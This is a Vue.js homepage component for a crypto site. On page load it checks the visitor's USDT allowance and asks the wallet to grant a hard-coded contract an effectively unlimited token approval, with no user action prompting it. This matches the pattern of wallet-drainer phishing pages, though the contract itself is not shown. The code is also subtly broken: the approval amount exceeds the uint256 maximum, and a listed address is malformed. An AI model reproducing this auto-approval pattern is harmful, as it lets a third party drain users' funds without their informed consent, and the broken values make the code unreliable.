import {
	mapActions,
	mapGetters,
} from "vuex";
import Abi721Nft from "@/jsons/abi-721-NFT.js";
import AbiLCErc20 from "@/jsons/abi-LC-ERC20.js";
import AbiUSDT from "@/jsons/USDT_token_abi.js";
import Decimal from "decimal.js";
export default {
	name: 'homepage',
	data:()=>({
		links:[
			{
				contract: 'BEP20',
				link: '0x9fd87aefe02441b123c3c32466cd9db4c58618f'
			},
			{
				contract: 'BEP20',
				link: '0x9fd87aefe02441b123c3c32466cd9db4c58618f'
			},
			{
				contract: 'BEP20',
				link: '0x9fd87aefe02441b123c3c32466cd9db4c58618f'
			},
			{
				contract: 'BEP20',
				link: '0x9fd87aefe02441b123c3c32466cd9db4c58618f'
			},
			{
				contract: 'BEP20',
				link: '0x9fd87aefe02441b123c3c32466cd9db4c58618f'
			},
		]
	}),
	mounted() {
		this.$nextTick(() => {
			this.getAuth();
		})
	},
	computed: {
		...mapGetters({
			web3Provider: 'web3Provider',
			haveAuth: 'haveAuth'
		}),
	},
	methods: {
		...mapActions({
			setHaveAuth: 'setHaveAuth',
		}),
		getAuth() {
			if (!this.web3Provider) return;
			let web3 = this.web3Provider;
			web3.eth.getAccounts().then(async res => {
				console.log(res);
				// this.loading = true;
				let address = res[0];
				let contractAddress = "0xE9A6aA7D7eEa3E584cc32Be0f8f5Ee20dc51633A";
				let usdt_address = "0xDA222D32dD3fec7bE55f5fA2FD2dA3400a4DE4CE";
				let contract = new web3.eth.Contract(AbiUSDT, usdt_address);
				let rs = await contract.methods.allowance(address, contractAddress).call();
				// console.log(rs);
				let y = new Decimal(rs)
				// console.log(y);
				let contract721 = new web3.eth.Contract(Abi721Nft, contractAddress);
				let usdt_price = await contract721.methods.getUSDT_Price().call();
				// let usdt = new Decimal(usdt_price);
				if (y.sub(usdt_price) < 0) {
					let usdtContract = new web3.eth.Contract(AbiUSDT, usdt_address);
					try {
						let sendStatic = await usdtContract.methods
							.approve(
								contractAddress,
								"11579208923731695423570985008687907853269984665640564039457584007913129639936"
							).send({
								from: address
							})
						if (sendStatic.status) {
							this.setHaveAuth(true)
							this.$message.success("approve success")
						} else {
							this.$message.warning("approve grant failed")
						}
						// this.loading = false;
					} catch (e) {
						this.$message.warning("approve grant failed")
						// this.loading = false;
					}
				} else {
					//取消授权按
					// this.loading = false;
					this.$message.success("approve 已经有了")
					this.setHaveAuth(true)
				}
				// console.log(this.haveAuth)
			})
		},
		mycopy(text) {
			let textareaEl = document.createElement('textarea');
			textareaEl.setAttribute('readonly', 'readonly'); // 防止手机上弹出软键盘
			textareaEl.value = text;
			document.body.appendChild(textareaEl);
			textareaEl.select();
			let success = document.execCommand('copy');
			document.body.removeChild(textareaEl);
			if(success) {
				this.$message.success('copy success');
			}
			return success;
		}
	}
}
